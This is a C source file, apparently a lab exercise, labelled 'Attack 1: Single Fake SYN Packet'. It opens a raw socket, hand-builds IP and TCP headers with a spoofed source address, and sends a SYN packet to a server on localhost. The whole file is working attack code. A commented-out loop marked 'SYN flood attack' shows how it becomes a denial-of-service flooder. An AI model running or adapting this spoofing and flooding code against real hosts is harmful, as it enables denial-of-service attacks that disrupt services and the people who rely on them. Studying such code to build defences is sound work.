// Attack 1: Single Fake SYN Packet
// Created by calvinlau on 16/11/18.
//

#include<stdio.h>
#include<string.h> //memset
#include<sys/socket.h>
#include<stdlib.h> //for exit(0);
#include<errno.h> //For errno - the error number
#include<netinet/tcp.h>	//Provides declarations for tcp header
#include<netinet/ip.h>	//Provides declarations for ip header
#include<arpa/inet.h>

#include<unistd.h>

#define SPOOF_PORT 31229 // spoofed arbitrary port
#define SPOOF_IPADDR "127.0.0.9" // spoofed arbitrary IP address
#define DEST_IPADDR "127.0.0.1" // destination IP address is server's IP address
#define DEST_PORT 31228 // destination port is server's port

struct pseudo_header
// Used for TCP checksum calculation
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;

    struct tcphdr tcp;
};

unsigned short csum(unsigned short *ptr,int nbytes) {
// IP checksum calculation
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}

int main (void) {
    // Create raw socket_fd
    int socket_fd;
    if ((socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        printf("~~~socket() error: %d\n", socket_fd);
    } else {
        printf("~~~socket() success: %d\n", socket_fd);
    }
    // Datagram to represent the packet
    char datagram[4096], source_ip[32];
    // IP header
    struct iphdr *iph = (struct iphdr *) datagram;
    // TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in dest_addr;
    struct pseudo_header psh;

    strcpy(source_ip, SPOOF_IPADDR);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(DEST_PORT);
    dest_addr.sin_addr.s_addr = inet_addr(DEST_IPADDR);

    memset (datagram, 0, 4096);

    // Fill in the IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;		// Use 0 as a placeholder prior to checksum calculation
    iph->saddr = inet_addr ( source_ip );	// Source address spoofed to arbitrary IP address
    iph->daddr = dest_addr.sin_addr.s_addr;

    //TCP Header
    tcph->source = htons(SPOOF_PORT);
    tcph->dest = htons(DEST_PORT);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5; // Offset to length of TCP header (without flags it is 5)
    tcph->fin=0;
    tcph->syn=1; // Set TCP SYN flag
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons(5840);	// Max window size
    tcph->th_sum = 0;   // Set TCP checksum to 0 -> offload checksum calculation to kernel
    tcph->urg_ptr = 0;

    // Fill in IP checksum
    psh.source_address = inet_addr( source_ip );
    psh.dest_address = dest_addr.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));

    tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));

    // Inform kernel that IP headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        printf ("~~~Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
        exit(0);
    }

    // while loop for SYN flood attack
//    while (true)
//    {
    // Send packet using sendto()
    ssize_t bytes_sent = sendto(socket_fd,	// Raw socket file descriptor
                                datagram,	// Raw packet
                                iph->tot_len,	// Length of raw packet
                                0, // Routing flags
                                (struct sockaddr *) &dest_addr,	// Socket destination address
                                sizeof (dest_addr)); // Size of socket destination address
    if (bytes_sent < 0) // Catch sendto() errors
    {
        printf ("~~~error: %ld\n", bytes_sent);
    }
    else // Raw packet successfully sent
    {
        printf ("~~~Packet sent to destination IP address %s and destination port %d. Bytes sent: %ld\n", DEST_IPADDR, DEST_PORT, bytes_sent);
    }
//    }
}
